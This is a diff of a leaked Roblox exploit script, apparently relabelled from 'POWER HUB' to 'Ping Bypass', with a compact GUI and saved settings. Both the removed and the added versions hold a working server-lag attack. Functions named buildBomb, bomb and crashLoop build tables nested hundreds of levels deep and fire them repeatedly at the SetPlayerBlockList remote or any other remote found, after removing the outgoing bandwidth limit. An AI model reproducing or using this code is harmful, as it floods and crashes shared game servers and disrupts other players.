@@ -1,584 +1,597 @@
 if not script_key then
     game:GetService("Players").LocalPlayer:Kick("❌ Error: Missing script_key!")
     return
-endrepeat task.wait() until game:IsLoaded()
---[[
-    POWER HUB⚡️ - Compact Modern Glass Style with Minimize Button
-    - Smaller & more compact design
-    - Added Minimize / Maximize toggle button (-)
-]]
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
+print("leaked by slivin and eugene🥷")
 
-local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local NetworkClient = game:GetService("NetworkClient")
 
--- Cleanup old GUI
-local function CleanupOldGUIs()
-    local existing = CoreGui:FindFirstChild("PowerHubBypass")
-    if existing then existing:Destroy() end
-end
-CleanupOldGUIs()
+local LocalPlayer = Players.LocalPlayer
 
--- Config
-local ConfigFile = "PowerHubConfig.json"
-local Config = { 
-    Keybind = "V", 
-    PCPower = 97000,
-    MobilePower = 72000,
-    Mode = "PC",
+local CONFIG = {
+    Names = {
+        ScreenGui = "PingBypass",
+        MainFrame = "Main",
+        Panel = "Panel",
+        ReopenBtn = "Reopen"
+    },
+    Size = {
+        MainFrame = UDim2.new(0, 282, 0, 214),
+        ReopenBtn = UDim2.new(0, 56, 0, 26),
+        Panel = UDim2.new(1, -16, 1, -16),
+        ToggleButton = UDim2.new(1, -4, 0, 46),
+        OptionFrame = UDim2.new(1, -2, 0, 34)
+    },
+    Position = {
+        MainFrame = UDim2.new(0.5, -141, 0.5, -107),
+        ReopenBtn = UDim2.new(0, 20, 0.5, -13),
+        Panel = UDim2.new(0, 8, 0, 8)
+    },
+    Colors = {
+        MainBackground = Color3.fromRGB(18, 18, 18),
+        PanelBackground = Color3.fromRGB(12, 12, 12),
+        OptionBackground = Color3.fromRGB(28, 28, 28),
+        ButtonDisabled = Color3.fromRGB(22, 22, 22),
+        ButtonEnabled = Color3.fromRGB(40, 140, 40),
+        Accent = Color3.fromRGB(60, 130, 240),
+        TextPrimary = Color3.fromRGB(245, 245, 245),
+        TextSecondary = Color3.fromRGB(150, 150, 150)
+    },
+    Text = {
+        Title = "Ping Bypass",
+        Footer = "Standard Menu",
+        DefaultBind = Enum.KeyCode.F
+    },
+    Values = {
+        Option1Default = 22,
+        Option2Default = 120
+    }
 }
 
-local function SaveConfig()
-    if writefile then
-        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
-    end
+local GUI, MainFrame, ReopenBtn
+local Panel, TitleLabel, ToggleBtn, CloseBtn
+local BindFrame, BindTitle, BindBtn
+local Option1Frame, Opt1Title, Opt1Val, Opt1Minus, Opt1Plus
+local Option2Frame, Opt2Title, Opt2Val, Opt2Minus, Opt2Plus
+local FooterLabel
+
+local isEnabled = false
+local currentBind = CONFIG.Text.DefaultBind
+local isBinding = false
+local opt1Value = CONFIG.Values.Option1Default
+local opt2Value = CONFIG.Values.Option2Default
+
+local laggerEnabled = false
+local laggerThread = nil
+local cachedRemote = nil
+
+local cfg = {
+    lag1 = opt1Value,
+    lag2 = opt2Value,
+    tries = 2,
+    waitTime = 0.045
+}
+
+local function createCorner(parent, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius)
+    corner.Parent = parent
+    return corner
 end
 
-local function LoadConfig()
-    if isfile and isfile(ConfigFile) then
-        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
-        if success and data then
-            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
-            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
-            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
-            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
+local function createStroke(parent, color, thickness, transparency)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = color
+    stroke.Thickness = thickness
+    stroke.Transparency = transparency
+    stroke.Parent = parent
+    return stroke
+end
+
+local function makeDraggable(frame)
+    local dragging, dragInput, dragStart, startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        TweenService:Create(frame, TweenInfo.new(0.1), {
+            Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        }):Play()
+    end
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
+end
+
+local function getDirectRemote()
+    local ok, result = pcall(function()
+        return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList")
+    end)
+    if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+        return result
+    end
+    return nil
+end
+
+local function findRemote()
+    if cachedRemote and cachedRemote.Parent then return cachedRemote end
+    local paths = {
+        function() return game:GetService("RobloxReplicatedStorage"):FindFirstChild("SetPlayerBlockList") end,
+        function() return ReplicatedStorage:FindFirstChild("SetPlayerBlockList") end,
+        function() return game:FindFirstChild("SetPlayerBlockList", true) end,
+    }
+    for _, pathFn in ipairs(paths) do
+        local ok, result = pcall(pathFn)
+        if ok and result and (result:IsA("RemoteEvent") or result:IsA("UnreliableRemoteEvent") or result:IsA("RemoteFunction")) then
+            cachedRemote = result; return result
+        end
+    end
+    local services = {ReplicatedStorage, game:FindFirstChild("RobloxReplicatedStorage")}
+    for _, service in ipairs(services) do
+        if service then
+            for _, obj in ipairs(service:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") or obj:IsA("RemoteFunction") then
+                    local n = obj.Name:lower()
+                    if n:find("block") or n:find("steal") or n:find("accept")
+                    or n:find("report") or n:find("player") or n:find("lag") then
+                        cachedRemote = obj; return obj
+                    end
+                end
+            end
+        end
+    end
+    for _, service in ipairs(services) do
+        if service then
+            for _, obj in ipairs(service:GetDescendants()) do
+                if obj:IsA("RemoteEvent") or obj:IsA("UnreliableRemoteEvent") then
+                    cachedRemote = obj; return obj
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local function getRemote()
+    return getDirectRemote() or findRemote()
+end
+
+local function bomb(tableincrease, maxCap, tries)
+    local maintable = {}
+    local spammedtable = {{}}
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local t = {}; table.insert(z, t); z = t
+    end
+    local maximum = math.min(99999 / (tableincrease + 2), maxCap * 5)
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = getRemote()
+    if remote then
+        for i = 1, tries do
+            local ok = pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+            if not ok then cachedRemote = nil end
         end
     end
 end
-LoadConfig()
 
--- Bomb parameters
-local DEPTH = 296
-
-local function buildBomb(power)
-    local maintable = {}
-    local spammedtable = {}
-    table.insert(spammedtable, {})
-    local z = spammedtable[1]
-    for i = 1, DEPTH do
-        local tableins = {}
-        table.insert(z, tableins)
-        z = tableins
-    end
-    local maxRep = math.floor(power / (DEPTH + 2))
-    for i = 1, maxRep do
-        table.insert(maintable, spammedtable)
-    end
-    return maintable
-end
-
--- Compact Glass GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "PowerHubBypass"
-ScreenGui.Parent = CoreGui
-ScreenGui.ResetOnSpawn = false
-
-local MainFrame = Instance.new("Frame")
-MainFrame.Parent = ScreenGui
-MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
-MainFrame.BackgroundTransparency = 0.15
-MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
-MainFrame.Size = UDim2.new(0, 220, 0, 195)
-MainFrame.ClipsDescendants = true
-local MainCorner = Instance.new("UICorner", MainFrame)
-MainCorner.CornerRadius = UDim.new(0, 12)
-local MainStroke = Instance.new("UIStroke", MainFrame)
-MainStroke.Color = Color3.fromRGB(255, 255, 255)
-MainStroke.Thickness = 1.2
-MainStroke.Transparency = 0.5
-
--- Glow effect
-local GlowFrame = Instance.new("Frame", MainFrame)
-GlowFrame.Size = UDim2.new(1, 0, 1, 0)
-GlowFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-GlowFrame.BackgroundTransparency = 0.95
-GlowFrame.BorderSizePixel = 0
-local GlowCorner = Instance.new("UICorner", GlowFrame)
-GlowCorner.CornerRadius = UDim.new(0, 12)
-
--- Header
-local Header = Instance.new("Frame")
-Header.Parent = MainFrame
-Header.BackgroundTransparency = 1
-Header.Size = UDim2.new(1, 0, 0, 42)
-
-local Title = Instance.new("TextLabel", Header)
-Title.BackgroundTransparency = 1
-Title.Position = UDim2.new(0, 10, 0, 2)
-Title.Size = UDim2.new(0.4, -10, 0, 20)
-Title.Font = Enum.Font.GothamBlack
-Title.Text = "POWER HUB⚡️"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 13
-Title.TextXAlignment = Enum.TextXAlignment.Left
-
-local Subtitle = Instance.new("TextLabel", Header)
-Subtitle.BackgroundTransparency = 1
-Subtitle.Position = UDim2.new(0, 10, 0, 22)
-Subtitle.Size = UDim2.new(0.4, -10, 0, 15)
-Subtitle.Font = Enum.Font.Gotham
-Subtitle.Text = "compact"
-Subtitle.TextColor3 = Color3.fromRGB(150, 150, 150)
-Subtitle.TextSize = 8
-Subtitle.TextXAlignment = Enum.TextXAlignment.Left
-
--- Mode Switch Button
-local ModeSwitchBtn = Instance.new("TextButton", Header)
-ModeSwitchBtn.Position = UDim2.new(0.43, 0, 0.5, -11)
-ModeSwitchBtn.Size = UDim2.new(0, 52, 0, 22)
-ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-ModeSwitchBtn.Font = Enum.Font.GothamBold
-ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOB"
-ModeSwitchBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ModeSwitchBtn.TextSize = 9
-ModeSwitchBtn.AutoButtonColor = false
-local ModeCorner = Instance.new("UICorner", ModeSwitchBtn)
-ModeCorner.CornerRadius = UDim.new(0, 16)
-local ModeStroke = Instance.new("UIStroke", ModeSwitchBtn)
-ModeStroke.Color = Color3.fromRGB(200, 200, 200)
-ModeStroke.Thickness = 1
-
--- Minimize / Maximize Toggle Button (-) / (+)
-local MinMaxBtn = Instance.new("TextButton", Header)
-MinMaxBtn.Position = UDim2.new(0.79, 0, 0.5, -11)
-MinMaxBtn.Size = UDim2.new(0, 38, 0, 22)
-MinMaxBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-MinMaxBtn.Font = Enum.Font.GothamBold
-MinMaxBtn.Text = "-"
-MinMaxBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-MinMaxBtn.TextSize = 12
-MinMaxBtn.AutoButtonColor = false
-local MinMaxCorner = Instance.new("UICorner", MinMaxBtn)
-MinMaxCorner.CornerRadius = UDim.new(0, 16)
-local MinMaxStroke = Instance.new("UIStroke", MinMaxBtn)
-MinMaxStroke.Color = Color3.fromRGB(200, 200, 200)
-MinMaxStroke.Thickness = 1
-
--- Scroll container
-local ContentFrame = Instance.new("ScrollingFrame")
-ContentFrame.Parent = MainFrame
-ContentFrame.BackgroundTransparency = 1
-ContentFrame.Position = UDim2.new(0, 8, 0, 46)
-ContentFrame.Size = UDim2.new(1, -16, 1, -52)
-ContentFrame.ScrollBarThickness = 2
-ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
-
-local Container = Instance.new("Frame")
-Container.Parent = ContentFrame
-Container.BackgroundTransparency = 1
-Container.Size = UDim2.new(1, 0, 0, 0)
-
-local UIList = Instance.new("UIListLayout", Container)
-UIList.SortOrder = Enum.SortOrder.LayoutOrder
-UIList.Padding = UDim.new(0, 6)
-
-local function updateCanvas()
-    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Container.AbsoluteSize.Y + 4)
-end
-UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
-task.defer(updateCanvas)
-
--- ===== PC MODE =====
-local PCElements = Instance.new("Frame", Container)
-PCElements.Size = UDim2.new(1, 0, 0, 0)
-PCElements.BackgroundTransparency = 1
-PCElements.Visible = Config.Mode == "PC"
-
-local PCUIList = Instance.new("UIListLayout", PCElements)
-PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
-PCUIList.Padding = UDim.new(0, 6)
-
--- Toggle Card
-local PCCard = Instance.new("Frame", PCElements)
-PCCard.Size = UDim2.new(1, 0, 0, 36)
-PCCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-PCCard.BackgroundTransparency = 0.5
-local PCCardCorner = Instance.new("UICorner", PCCard)
-PCCardCorner.CornerRadius = UDim.new(0, 10)
-local PCCardStroke = Instance.new("UIStroke", PCCard)
-PCCardStroke.Color = Color3.fromRGB(150, 150, 150)
-PCCardStroke.Thickness = 0.5
-
-local PCToggleBtn = Instance.new("TextButton", PCCard)
-PCToggleBtn.Size = UDim2.new(1, -16, 1, -8)
-PCToggleBtn.Position = UDim2.new(0, 8, 0, 4)
-PCToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-PCToggleBtn.Font = Enum.Font.GothamBold
-PCToggleBtn.Text = "DISABLED"
-PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
-PCToggleBtn.TextSize = 11
-PCToggleBtn.AutoButtonColor = false
-local PCToggleCorner = Instance.new("UICorner", PCToggleBtn)
-PCToggleCorner.CornerRadius = UDim.new(0, 6)
-
--- Keybind Card
-local PCKeyCard = Instance.new("Frame", PCElements)
-PCKeyCard.Size = UDim2.new(1, 0, 0, 28)
-PCKeyCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-PCKeyCard.BackgroundTransparency = 0.5
-local PCKeyCorner = Instance.new("UICorner", PCKeyCard)
-PCKeyCorner.CornerRadius = UDim.new(0, 10)
-local PCKeyStroke = Instance.new("UIStroke", PCKeyCard)
-PCKeyStroke.Color = Color3.fromRGB(150, 150, 150)
-PCKeyStroke.Thickness = 0.5
-
-local PCKeyLabel = Instance.new("TextLabel", PCKeyCard)
-PCKeyLabel.Size = UDim2.new(0.5, -8, 1, 0)
-PCKeyLabel.Position = UDim2.new(0, 8, 0, 0)
-PCKeyLabel.BackgroundTransparency = 1
-PCKeyLabel.Font = Enum.Font.Gotham
-PCKeyLabel.Text = "Keybind"
-PCKeyLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-PCKeyLabel.TextSize = 10
-PCKeyLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local PCKeybindBtn = Instance.new("TextButton", PCKeyCard)
-PCKeybindBtn.Position = UDim2.new(0.65, 0, 0.5, -8)
-PCKeybindBtn.Size = UDim2.new(0, 50, 0, 16)
-PCKeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-PCKeybindBtn.Font = Enum.Font.GothamBold
-PCKeybindBtn.Text = Config.Keybind
-PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-PCKeybindBtn.TextSize = 10
-local PCKeyCornerBtn = Instance.new("UICorner", PCKeybindBtn)
-PCKeyCornerBtn.CornerRadius = UDim.new(0, 5)
-
--- Power Card
-local PCPowerCard = Instance.new("Frame", PCElements)
-PCPowerCard.Size = UDim2.new(1, 0, 0, 28)
-PCPowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-PCPowerCard.BackgroundTransparency = 0.5
-local PCPowerCorner = Instance.new("UICorner", PCPowerCard)
-PCPowerCorner.CornerRadius = UDim.new(0, 10)
-local PCPowerStroke = Instance.new("UIStroke", PCPowerCard)
-PCPowerStroke.Color = Color3.fromRGB(150, 150, 150)
-PCPowerStroke.Thickness = 0.5
-
-local PCPowerLabel = Instance.new("TextLabel", PCPowerCard)
-PCPowerLabel.Size = UDim2.new(0.5, -8, 1, 0)
-PCPowerLabel.Position = UDim2.new(0, 8, 0, 0)
-PCPowerLabel.BackgroundTransparency = 1
-PCPowerLabel.Font = Enum.Font.Gotham
-PCPowerLabel.Text = "Power"
-PCPowerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-PCPowerLabel.TextSize = 10
-PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local PCPowerInput = Instance.new("TextBox", PCPowerCard)
-PCPowerInput.Position = UDim2.new(0.6, 0, 0.5, -8)
-PCPowerInput.Size = UDim2.new(0, 60, 0, 16)
-PCPowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-PCPowerInput.Font = Enum.Font.GothamBold
-PCPowerInput.Text = tostring(Config.PCPower)
-PCPowerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-PCPowerInput.TextSize = 9
-PCPowerInput.ClearTextOnFocus = false
-local PCPowerInputCorner = Instance.new("UICorner", PCPowerInput)
-PCPowerInputCorner.CornerRadius = UDim.new(0, 5)
-
--- Footer
-local PCFooter = Instance.new("TextLabel", PCElements)
-PCFooter.BackgroundTransparency = 1
-PCFooter.Size = UDim2.new(1, 0, 0, 16)
-PCFooter.Font = Enum.Font.Gotham
-PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
-PCFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
-PCFooter.TextSize = 8
-
--- ===== MOBILE MODE =====
-local MobileElements = Instance.new("Frame", Container)
-MobileElements.Size = UDim2.new(1, 0, 0, 0)
-MobileElements.BackgroundTransparency = 1
-MobileElements.Visible = Config.Mode == "Mobile"
-
-local MobileUIList = Instance.new("UIListLayout", MobileElements)
-MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
-MobileUIList.Padding = UDim.new(0, 6)
-
--- Toggle Card
-local MobileCard = Instance.new("Frame", MobileElements)
-MobileCard.Size = UDim2.new(1, 0, 0, 36)
-MobileCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-MobileCard.BackgroundTransparency = 0.5
-local MobileCardCorner = Instance.new("UICorner", MobileCard)
-MobileCardCorner.CornerRadius = UDim.new(0, 10)
-
-local MobileToggleBtn = Instance.new("TextButton", MobileCard)
-MobileToggleBtn.Size = UDim2.new(1, -16, 1, -8)
-MobileToggleBtn.Position = UDim2.new(0, 8, 0, 4)
-MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-MobileToggleBtn.Font = Enum.Font.GothamBold
-MobileToggleBtn.Text = "OFF"
-MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
-MobileToggleBtn.TextSize = 11
-MobileToggleBtn.AutoButtonColor = false
-local MobileToggleCorner = Instance.new("UICorner", MobileToggleBtn)
-MobileToggleCorner.CornerRadius = UDim.new(0, 6)
-
--- Power Card
-local MobilePowerCard = Instance.new("Frame", MobileElements)
-MobilePowerCard.Size = UDim2.new(1, 0, 0, 28)
-MobilePowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-MobilePowerCard.BackgroundTransparency = 0.5
-local MobilePowerCorner = Instance.new("UICorner", MobilePowerCard)
-MobilePowerCorner.CornerRadius = UDim.new(0, 10)
-
-local MobilePowerLabel = Instance.new("TextLabel", MobilePowerCard)
-MobilePowerLabel.Size = UDim2.new(0.5, -8, 1, 0)
-MobilePowerLabel.Position = UDim2.new(0, 8, 0, 0)
-MobilePowerLabel.BackgroundTransparency = 1
-MobilePowerLabel.Font = Enum.Font.Gotham
-MobilePowerLabel.Text = "Power"
-MobilePowerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-MobilePowerLabel.TextSize = 10
-MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local MobilePowerInput = Instance.new("TextBox", MobilePowerCard)
-MobilePowerInput.Position = UDim2.new(0.6, 0, 0.5, -8)
-MobilePowerInput.Size = UDim2.new(0, 60, 0, 16)
-MobilePowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-MobilePowerInput.Font = Enum.Font.GothamBold
-MobilePowerInput.Text = tostring(Config.MobilePower)
-MobilePowerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-MobilePowerInput.TextSize = 9
-MobilePowerInput.ClearTextOnFocus = false
-local MobilePowerInputCorner = Instance.new("UICorner", MobilePowerInput)
-MobilePowerInputCorner.CornerRadius = UDim.new(0, 5)
-
--- Footer
-local MobileFooter = Instance.new("TextLabel", MobileElements)
-MobileFooter.BackgroundTransparency = 1
-MobileFooter.Size = UDim2.new(1, 0, 0, 16)
-MobileFooter.Font = Enum.Font.Gotham
-MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
-MobileFooter.TextColor3 = Color3.fromRGB(120, 120, 120)
-MobileFooter.TextSize = 8
-
--- ===== LOGIC =====
-local running = false
-local bomb = nil
-local spamThread = nil
-local currentMode = Config.Mode
-local SPAM_DELAY = 0.12
-local isMinimized = false
-
--- Minimize / Maximize Logic (- / +)
-MinMaxBtn.MouseButton1Click:Connect(function()
-    isMinimized = not isMinimized
-    if isMinimized then
-        MinMaxBtn.Text = "+"
-        ContentFrame.Visible = false
-        MainFrame:TweenSize(UDim2.new(0, 220, 0, 42), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true)
-    else
-        MinMaxBtn.Text = "-"
-        MainFrame:TweenSize(UDim2.new(0, 220, 0, 195), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2, true, function()
-            ContentFrame.Visible = true
-        end)
-    end
-end)
-
-local function getCurrentPower()
-    return currentMode == "PC" and Config.PCPower or Config.MobilePower
-end
-
-local function restartSpamLoop()
-    if running then
-        if spamThread then task.cancel(spamThread) end
-        local power = getCurrentPower()
-        bomb = buildBomb(power)
-        spamThread = task.spawn(function()
-            while running do
-                if bomb then
-                    pcall(function()
-                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
-                    end)
-                end
-                task.wait(SPAM_DELAY)
+local function crashLoop()
+    while laggerEnabled do
+        pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
+        pcall(function() settings().Network.IncomingReplicationLag = 0 end)
+        bomb(cfg.lag1, cfg.lag2, cfg.tries)
+        pcall(function()
+            for i = 1, 30 do
+                game:GetService("Stats"):Get("Network.ServerStatsItem")
             end
         end)
+        task.wait(cfg.waitTime)
     end
 end
 
-local function updateToggleVisuals(enabled)
-    if currentMode == "PC" then
-        if enabled then
-            PCToggleBtn.Text = "ENABLED"
-            PCToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            PCCardStroke.Color = Color3.fromRGB(255, 255, 255)
-            MainStroke.Color = Color3.fromRGB(255, 255, 255)
-            MainStroke.Transparency = 0
-            ModeStroke.Color = Color3.fromRGB(255, 255, 255)
-        else
-            PCToggleBtn.Text = "DISABLED"
-            PCToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
-            PCCardStroke.Color = Color3.fromRGB(150, 150, 150)
-            MainStroke.Color = Color3.fromRGB(255, 255, 255)
-            MainStroke.Transparency = 0.5
-            ModeStroke.Color = Color3.fromRGB(200, 200, 200)
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(crashLoop)
+    coroutine.resume(laggerThread)
+    updateToggleUI()
+end
+
+local function stopLagger()
+    laggerEnabled = false
+    if laggerThread then
+        pcall(function() coroutine.close(laggerThread) end)
+        laggerThread = nil
+    end
+    updateToggleUI()
+end
+
+local function toggleLagger()
+    if laggerEnabled then
+        stopLagger()
+    else
+        startLagger()
+    end
+end
+
+local CONFIG_FILE = "PingBypassConfig"
+
+local function saveConfig()
+    local data = {
+        lag1 = cfg.lag1,
+        lag2 = cfg.lag2,
+        tries = cfg.tries,
+        waitTime = cfg.waitTime,
+        key = currentBind.Name,
+        enabled = laggerEnabled
+    }
+    local json = HttpService:JSONEncode(data)
+    pcall(function()
+        writefile(CONFIG_FILE, json)
+    end)
+end
+
+local function loadConfig()
+    local ok, data = pcall(function()
+        return readfile(CONFIG_FILE)
+    end)
+    if ok and data then
+        local decoded = HttpService:JSONDecode(data)
+        cfg.lag1 = decoded.lag1 or cfg.lag1
+        cfg.lag2 = decoded.lag2 or cfg.lag2
+        cfg.tries = decoded.tries or cfg.tries
+        cfg.waitTime = decoded.waitTime or cfg.waitTime
+        if decoded.key then
+            local key = Enum.KeyCode[decoded.key]
+            if key then currentBind = key end
         end
-    else
-        if enabled then
-            MobileToggleBtn.Text = "ON"
-            MobileToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-            MainStroke.Color = Color3.fromRGB(255, 255, 255)
-            MainStroke.Transparency = 0
-            ModeStroke.Color = Color3.fromRGB(255, 255, 255)
-        else
-            MobileToggleBtn.Text = "OFF"
-            MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 180, 180)
-            MainStroke.Color = Color3.fromRGB(255, 255, 255)
-            MainStroke.Transparency = 0.5
-            ModeStroke.Color = Color3.fromRGB(200, 200, 200)
+        if decoded.enabled then
+            task.wait(0.5)
+            startLagger()
         end
+        opt1Value = cfg.lag1
+        opt2Value = cfg.lag2
+        if Opt1Val then Opt1Val.Text = tostring(opt1Value) end
+        if Opt2Val then Opt2Val.Text = tostring(opt2Value) end
+        if BindBtn then BindBtn.Text = currentBind.Name end
     end
 end
 
-local function TogglePCBypass()
-    running = not running
-    updateToggleVisuals(running)
-    if running then
-        NetworkClient:SetOutgoingKBPSLimit(math.huge)
-        restartSpamLoop()
+local function createGUI()
+    GUI = Instance.new("ScreenGui")
+    GUI.Name = CONFIG.Names.ScreenGui
+    GUI.ResetOnSpawn = false
+    GUI.DisplayOrder = 999
+    GUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    
+    local success = pcall(function() GUI.Parent = CoreGui end)
+    if not success then GUI.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+    MainFrame = Instance.new("Frame")
+    MainFrame.Name = CONFIG.Names.MainFrame
+    MainFrame.Size = CONFIG.Size.MainFrame
+    MainFrame.Position = CONFIG.Position.MainFrame
+    MainFrame.BackgroundColor3 = CONFIG.Colors.MainBackground
+    MainFrame.BorderSizePixel = 0
+    MainFrame.Active = true
+    MainFrame.Parent = GUI
+    
+    createCorner(MainFrame, 10)
+    createStroke(MainFrame, CONFIG.Colors.Accent, 1, 0.5)
+
+    ReopenBtn = Instance.new("TextButton")
+    ReopenBtn.Name = CONFIG.Names.ReopenBtn
+    ReopenBtn.Size = CONFIG.Size.ReopenBtn
+    ReopenBtn.Position = CONFIG.Position.ReopenBtn
+    ReopenBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
+    ReopenBtn.Text = "OPEN"
+    ReopenBtn.TextColor3 = CONFIG.Colors.Accent
+    ReopenBtn.Font = Enum.Font.GothamBold
+    ReopenBtn.TextSize = 12
+    ReopenBtn.Visible = false
+    ReopenBtn.Parent = GUI
+    
+    createCorner(ReopenBtn, 6)
+    createStroke(ReopenBtn, CONFIG.Colors.Accent, 1, 0.4)
+
+    Panel = Instance.new("Frame")
+    Panel.Name = CONFIG.Names.Panel
+    Panel.Size = CONFIG.Size.Panel
+    Panel.Position = CONFIG.Position.Panel
+    Panel.BackgroundTransparency = 1
+    Panel.Parent = MainFrame
+
+    TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Size = UDim2.new(1, -44, 0, 22)
+    TitleLabel.Position = UDim2.new(0, 4, 0, 4)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = CONFIG.Text.Title
+    TitleLabel.TextColor3 = CONFIG.Colors.TextPrimary
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.TextSize = 14
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = Panel
+
+    CloseBtn = Instance.new("TextButton")
+    CloseBtn.Size = UDim2.new(0, 36, 0, 20)
+    CloseBtn.Position = UDim2.new(1, -36, 0, 4)
+    CloseBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
+    CloseBtn.Text = "X"
+    CloseBtn.TextColor3 = CONFIG.Colors.TextPrimary
+    CloseBtn.Font = Enum.Font.GothamBold
+    CloseBtn.TextSize = 12
+    CloseBtn.Parent = Panel
+    createCorner(CloseBtn, 4)
+
+    ToggleBtn = Instance.new("TextButton")
+    ToggleBtn.Size = CONFIG.Size.ToggleButton
+    ToggleBtn.Position = UDim2.new(0, 4, 0, 32)
+    ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
+    ToggleBtn.Text = "DISABLED"
